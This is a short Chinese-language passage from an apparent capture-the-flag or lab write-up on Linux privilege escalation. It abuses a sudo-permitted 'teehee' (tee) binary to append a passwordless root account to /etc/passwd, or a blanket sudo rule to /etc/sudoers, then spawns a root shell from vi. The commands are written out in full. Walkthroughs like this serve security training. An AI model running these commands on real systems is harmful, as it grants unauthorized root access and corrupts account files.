**提权  
**  
![](../Images/72b6ce610edbaeac51559917f60c999d.png)拿到charles账号通过ssh登录后，执行**sudo -l**可以发现存在teehee，执行tee --help发现能追加文件内容，也就是说，| sudo teehee -a等价于 >>，于是有两种方法进行提权： 

  

方法一：往/etc/passwd写入一个免密的 root 权限用户。

*   
*   

```
echo "Tuzk1::0:0:::/bin/bash" | sudo teehee -a /etc/passwdsu Tuzk1
```

![](../Images/04d312a79d6769447dfc31ed54d85bf5.png)

  

方法二：写入/etc/sudoers，让 charles 获得免密执行 sudo 其他命令的权限，charles 可以在**任何地方**获得**等同root的权限**执行 **任何命令。**

*   
*   
*   
*   
*   

```
echo "charles ALL=(root) ALL" | sudo teehee -a /etc/sudoers# sudo vi提权vi privilege.txt# 输入charles的密码，然后输入：:!/bin/bash
```

![](../Images/88e8ece4819005f41055f084b1123234.png)
